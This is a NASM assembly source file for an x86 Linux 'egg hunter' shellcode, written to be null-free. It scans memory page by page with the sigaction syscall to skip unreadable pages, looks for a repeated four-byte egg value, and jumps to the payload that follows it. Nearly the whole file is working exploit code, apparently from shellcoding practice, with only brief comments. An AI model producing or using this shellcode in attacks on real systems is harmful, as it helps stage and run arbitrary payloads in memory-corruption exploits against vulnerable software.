; Filename: egghunter.nasm
; Purpose: creating a null free egg hunter shellcode


global _start

section .text

_start:
align_page:
    or cx,0xfff         ; Setup the page alignment

next_address:
    inc ecx	
	 
;-------------------------------------------------------------------
; set eax to 67 sigaction(2)
    push byte +0x43     
    pop eax            
    int 0x80            ; syscall

    cmp al,0xf2         ; check if page is unaccessable EFAULT
    jz align_page       ; try again on the next page
    mov eax, 0xF8F9F8F9 ; if accessable store egg in eax

;-------------------------------------------------------------------
; to use scasd The string to be searched should be in memory and pointed by the edi
    mov edi, ecx        
    scasd               ; is eax = edi ? and set new edi to edi+4
    jnz next_address    ; If it didn't match try the next address
    scasd               ; check for egg in the new edi then set new edi to edi+4
    jnz next_address    ; Next 4 bytes didn't match try next address

;-------------------------------------------------------------------
; egg found twice jmp to  the address after egg
    jmp edi             
